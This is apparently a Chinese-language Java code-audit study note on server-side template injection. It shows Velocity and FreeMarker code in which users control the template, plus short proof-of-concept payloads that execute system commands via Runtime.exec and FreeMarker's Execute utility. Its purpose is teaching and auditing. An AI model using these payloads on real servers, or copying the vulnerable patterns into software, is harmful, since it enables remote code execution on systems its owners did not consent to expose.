# 模板注入（SSTI）

## 0x00 Introduction
SSTI 就是服务器端模板注入（Server-Side Template Injection）

模板注入（SSTI）和SQL注入，命令注入一样都是都是非法的参数传入造成的安全问题，区别在于，SQL注入是参数到sql语句执行处，命令注入是到命令执行函数处，而模板注入则是到了模板渲染处触发漏洞。
起因在于现代Web应用MVC架构的中，动态渲染前端代码，所以不同的语言，不同的前端模板会存在不同的问题。

Java常见的引擎：Velocity,FreeMarker,Jade...

## 0x01 漏洞模式&危险函数

漏洞点更多在于后台模板管理中，可以自定义模板文件导致SSTI漏洞。

模板注入方式: 
1. 直接注入：直接注入模板文本中的变量和数据，以生成动态页面和其他交互式 Web 应用程序。这是最常见的注入方式，也是最简单的注入方式。
2. 模板引用注入：使用模板引用来注入模板文本中的变量和数据，以生成动态页面和其他交互式 Web 应用程序。这种方式可以在模板中使用变量和数据，而不必将它们直接注入到模板中。
3. 数据绑定注入：使用数据绑定技术，将数据与模板中的变量进行绑定，以生成动态页面和其他交互式 Web 应用程序。这种方式可以将数据与模板中的变量进行绑定，以便在模板中使用这些数据。

### Velocity

#### 语法
- [Velocity中文文档](https://wizardforcel.gitbooks.io/velocity-doc/content/1.html)

#### 危险函数

- 推荐阅读： [白头搔更短，SSTI惹人心！](https://xz.aliyun.com/t/7466)，其中会有漏洞分析。

`org.apache.velocity.app.Velocity.evaluate()`     
案例，模板template参数可控。
```java
private static void velocity(String template){
    Velocity.init();

    VelocityContext context = new VelocityContext();

    context.put("author", "Elliot A.");
    context.put("address", "217 E Broadway");
    context.put("phone", "555-1337");

    StringWriter swOut = new StringWriter();
    //使用Velocity，template参数可控
    Velocity.evaluate(context, swOut, "test", template);
}
```

poc:
```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc.exe")
```
### FreeMarker

#### 语法

- [在线手册](http://freemarker.foofun.cn/)


#### 危险函数


FreeMarker直接渲染用户输入payload会被转码而失效，所以一般的利用场景为上传或者修改模版文件。

`freemarker.template.Template.process()`

案例，模板文件可控。   
```java
public String freemarker() throws IOException, TemplateException {
    Configuration configuration = new Configuration(Configuration.VERSION_2_3_23);
    configuration.setClassForTemplateLoading(this.getClass(), "/templates");
    Template template = configuration.getTemplate("test.ftl");

    Map<String, Object> rootMap = new HashMap<String, Object>();
    rootMap.put("username", "passwd");
    StringWriter stringWriter = new StringWriter();
    template.process(rootMap, stringWriter);
    return stringWriter.toString();
}
```
poc:
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

## Ref

- https://xz.aliyun.com/t/7466
- https://github.com/proudwind/javasec_study/blob/master/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-ssti.md
- https://developer.aliyun.com/article/1235808